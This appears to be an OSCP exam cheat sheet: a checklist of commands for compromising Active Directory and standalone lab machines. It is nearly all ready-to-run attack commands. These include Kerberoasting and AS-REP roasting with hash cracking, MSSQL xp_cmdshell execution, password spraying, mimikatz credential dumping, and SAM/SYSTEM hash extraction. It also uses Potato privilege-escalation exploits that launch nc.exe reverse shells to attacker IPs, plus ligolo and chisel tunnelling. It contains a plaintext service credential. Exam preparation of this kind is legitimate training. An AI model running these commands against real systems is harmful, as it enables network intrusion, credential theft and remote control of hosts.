# OSCP

## üñ•Ô∏è MS01&#x20;

### üöÄ PE

* [x] <mark style="background-color:yellow;">Check user's privileges</mark>

- `SeImpersonatePrivilege` ‚Üí [escalate to LA](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege)

```powershell
# List current user's privileges
whoami /priv
```

* [x] <mark style="background-color:yellow;">Look for custom binaries</mark>

- `strings` locally&#x20;
- [Binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking

* [x] <mark style="background-color:yellow;">Enumerate domain users and build a wordlist</mark>

{% code overflow="wrap" %}
```bash
$ nxc smb <target> -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Enumerate SMB shares</mark>

```bash
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

* [x] <mark style="background-color:yellow;">Check for</mark> [<mark style="background-color:yellow;">AS-REP Roasting</mark>](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/asreproasting)

{% code overflow="wrap" %}
```bash
# AS-REPRoast
impacket-GetNPUsers oscp.exam/ -dc-ip 10.10.X.X -no-pass -usersfile domain_users

# Crack obtained hashes
hashcat -m 18200 asreproast_users /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Check for</mark> [<mark style="background-color:yellow;">Kerberoasting</mark>](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/kerberoasting)

{% code overflow="wrap" %}
```bash
# Kerberoast
impacket-GetUserSPNs -request -dc-ip 10.10.X.X oscp.exam/<user>

# Crack obtained hashes
hashcat -m 13100 kerberoast_users /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

* If `sql_svc` ‚Üí interact directly

{% code overflow="wrap" %}
```bash
# impacket
mssqlclient.py <domain>/<user>@<host> -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Remote queries
nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
# System RCE via xp_cmdshell
nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Password spray for lateral movement, PE, and remote access</mark>

{% code overflow="wrap" %}
```bash
# Pass-spray for lateral movement/PE (local auth)
nxc smb domain_ips -u domain_users -p passwords --continue-on-success --local-auth | grep +

# Pass-spray for lateral movement/PE
nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +

# Pass-spray for WinRM access
nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +

# Pass-spray for RDP access
nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Collect domain data</mark>

```bash
# Netexec
nxc ldap <dc-ip/FQDN> -u <user> -p <password> --bloodhound -c All --dns-server <dc-ip>

# Bloodhound-python
bloodhound-python -u <user> -p <password> -dc <FQDN> -c all -d <domain> -ns <dc-ip>
bloodhound-python -u <user> --hashes :<NTML> -dc <FQDN> -c all -d <domain> -ns <dc-ip>
```

### üîéPillaging

* [x] <mark style="background-color:yellow;">Dump cached credentials</mark>

```powershell
# Dump active sessions' creds
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump the SAM registry hive
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump the LSA secrets
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```

* [x] <mark style="background-color:yellow;">Check PowerShell history</mark>

{% code overflow="wrap" %}
```powershell
#Check host type
$Host.Name

# Check the PS history of the current user
(Get-PSReadlineOption).HistorySavePath

# Check the PS history of another user
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
{% endcode %}

### üñß Pivot

* [x] <mark style="background-color:yellow;">Start the server on the attacking host</mark>

```bash
# Start proxy
sudo ligolo-proxy -selfcert

# Create the interface
ligolo-ng ¬ª interface_create --name ligolo
```

* [x] <mark style="background-color:yellow;">Start the agent on the pivot host</mark>

```powershell
# Connect to the proxy
.\agent.exe -connect 192.168.X.X:11601 -ignore-cert
```

* [x] <mark style="background-color:yellow;">Set up routing on the attacking host</mark>

```bash
# List active sessions
ligolo-ng ¬ª session

# Add route
ligolo-ng ¬ª interface_add_route --name ligolo --route 172.16.10.0/24

# Start the tunnel
ligolo-ng ¬ª start
```

## üñ•Ô∏è MS02

### üöÄ PE

* [x] <mark style="background-color:yellow;">Connect via WinRM or RDP</mark>

```bash
# Connect via WinRM
evil-winrm -u <user> -p <pass> -i <MS02>

# Connect via RDP
xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
```

* [x] <mark style="background-color:yellow;">Check user's privileges</mark>

```powershell
# List current user's privileges
whoami /priv
```

{% code overflow="wrap" %}
```bash
# SigmaPotato
uv run nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file SigmaPotato.exe C:\\Windows\\Temp\\sp.exe

uv run nxc mssql <target-IP> -u <user> -p <pass> --local-auth -x "c:\windows\temp\sp.exe --revshell 10.10.14.5 53"

# PrintSpoofer
uv run nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file PrintSpoofer64.exe C:\\Windows\\Temp\\pf.exe

uv run nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file ../binaries/nc.exe C:\\Windows\\Temp\\nc.exe

uv run nxc mssql <target-IP> -u <user> -p <pass> --local-auth -x 'c:\windows\temp\pf.exe -c "nc.exe 10.10.14.10 53 -e cmd"'

# GodPotato
uv run nxc mssql <target-IP> -u <user> -p <pass> --put-file ../../tools/privesc/GodPotato-NET4.exe C:\\windows\\temp\\gp.exe

uv run nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file ../binaries/nc.exe C:\\Windows\\Temp\\nc.exe

uv run nxc mssql <target-IP> -u <user> -p <pass> -x 'c:\windows\temp\gp.exe -cmd "c:\windows\temp\nc.exe -t -e C:\windows\system32\cmd.exe 192.168.45.164 80"'

```
{% endcode %}

* [x] <mark style="background-color:yellow;">Check SMB access</mark>

```bash
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

* [x] <mark style="background-color:yellow;">Check for</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`C:\windows.old`</mark>

- Dump `SAM` and `SYSTEM` locally

{% code overflow="wrap" %}
```bash
# Download files with nxc
$ uv run nxc mssql <target-IP> -u sql_svc -p <pass> --get-file "c:\windows.old\windows\System32\SYSTEM" ./SYSTEM

$ uv run nxc mssql <target-IP> -u sql_svc -p <pass> --get-file "c:\windows.old\windows\System32\SAM" ./SAM

# Dump SAM's hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Read flag
$ nxc smb dc01 -u tom_admin -H <hash> -X "type c:\users\administrator\desktop\proof.txt"
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Look for custom binaries</mark>

- `strings` locally&#x20;
- [Binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking

* [x] <mark style="background-color:yellow;">Check for locally active sockets</mark>

```powershell
# List active sockets
netstat -ano
```

* [x] <mark style="background-color:yellow;">Port Forward</mark>

```bash
# Start server on the attacking host
$ ./chisel server -p 8000 --reverse
```

```powershell
# Tranfer binary
wget http://192.168.X.X:8888/chisel.exe -o chisel.exe

# Start client on target
# 3306 (target port) to 6033 (local port) 
.\chisel.exe client 192.168.X.X:8000 R:6033:127.0.0.1:3306
```

```bash
# Interact from attacking host
$ mysql -h 127.0.0.1 -P 6033 -u root
```

* [x] <mark style="background-color:yellow;">Check PowerShell history</mark>

{% code overflow="wrap" %}
```powershell
# Check the PS history of the current user
Get-Content (Get-PSReadlineOption).HistorySavePath

# Check the PS history of another user
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Password spray for potential PE (DA/LA on the DC)</mark>

{% code overflow="wrap" %}
```bash
# Pass-spray for PE (local auth)
nxc smb <dc-ip> -u domain_users -p passwords --continue-on-success --local-auth | grep +

# Pass-spray for PE
nxc smb <dc-ip> -u domain_users -p passwords --continue-on-success | grep +
```
{% endcode %}

* [x] <mark style="background-color:yellow;">Reverse Port Forward</mark>

```bash
# Add a listener to MS01 from Kali
[Agent : OSCP\eric.wallows@MS01] ¬ª listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444
```

{% code overflow="wrap" %}
```bash
# Upload binary to MS02
$ nxc mssql ms02 -u sql_svc -p Dolphin1 --put-file 'nc.exe' 'c:\windows\temp\nc.exe'

# Execute the binary from MS02 pointing to MS01
$ nxc mssql ms02 -u sql_svc -p Dolphin1 -x 'c:\windows\temp\nc.exe 10.10.63.147 4444 -e cmd.exe'
```
{% endcode %}

## üñ•Ô∏è Standalones

{% hint style="danger" %}
Make sure to port scan twice if you can't see a path!
{% endhint %}

### ü¶∂ Foothold

* [x] <mark style="background-color:yellow;">Port scan</mark>

- TCP ‚Üí manual probe/google "weird" ports, tech versions ‚Üí PoC

```bash
$ nc -nv 192.168.X.X <port>
# help
# version
```

* UDP ‚Üí SNMP ‚Üí repeated strings, usernames, creds, hints

```bash
# Enumerate public strings
snmpwalk -v2c -c public <target>

# Enumerate user-related strings
snmpwalk -v2c -c public <target> 1.3.6.1.4.1

# Grep-based enumeration
snmpwalk -v2c -c public <target> | grep -Ei 'user|admin|name|passwd'
```

* [x] <mark style="background-color:yellow;">Dirbust HTTP ports (don't forget file extensions)</mark>

- Check dirs for tech versions ‚Üí PoC
- Check file's metadata ‚Üí usernames ‚Üí weak creds (`bob:bob`)
- Look out for `.git` repos ‚Üí creds for remote access

```bash
# Dump the git repository locally
$ git-dumper http://192.168.X.X/.git/ ./<local-dir>

# Write all commits to a file
$ git log | grep commit | cut -d " " -f2 | xargs git show > commits
```

### üöÄ PE

* [x] <mark style="background-color:yellow;">Check access</mark>

```bash
sudo -l
```

```powershell
# List user's privileges (Windows)
whoami /priv
```

* [x] <mark style="background-color:yellow;">Run PE scripts</mark> ‚Üí [Binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking

```bash
# Transfer binary (Linux)
wget http://192.168.X.X:8888/linpeas.sh -o linpeas.sh

# Transfer binary (Windows)
wget http://192.168.X.X:8888/winPEASx64.exe -o winpeas.exe
```

* [x] <mark style="background-color:yellow;">Check SUIDs</mark> ‚Üí [GTFOBins](https://gtfobins.github.io/)/PoC

```bash
find / -type f -perm -u=s 2>/dev/null
```

* [x] <mark style="background-color:yellow;">Kernel version</mark> ‚Üí PoC

```bash
# List kernel information
uname -a
```

```powershell
# List system information (Windows)
systeminfo
```

* [x] <mark style="background-color:yellow;">Look for non-default files</mark>
* [x] <mark style="background-color:yellow;">Check for locally active sockets</mark>

```bash
# List active sockets
ss -tunlp

# Identify what the port is doing
lsof -i :8000
ps aux | grep 8000
```

```powershell
# List active sockets (Windows)
netstat -ano
```

* [x] <mark style="background-color:yellow;">Port forward</mark>

```bash
# Start server on the attacking host
$ ./chisel server -p 8000 --reverse
```

```powershell
# Tranfer binary
wget http://192.168.X.X:8888/chisel -o chisel

# Start client on target
# 3306 (target port) to 6033 (local port) 
./chisel client 192.168.X.X:8000 R:6033:127.0.0.1:3306
```

```bash
# Interact from attacking host
$ mysql -h 127.0.0.1 -P 6033 -u root
```

* [x] <mark style="background-color:yellow;">Check running processes/jobs</mark> ‚Üí cronjobs

```bash
# Transfer binary
wget http://192.168.X.X:8888/pspy32 -o pspy32

# Enumerate running processes/jobs
./pspy32
```
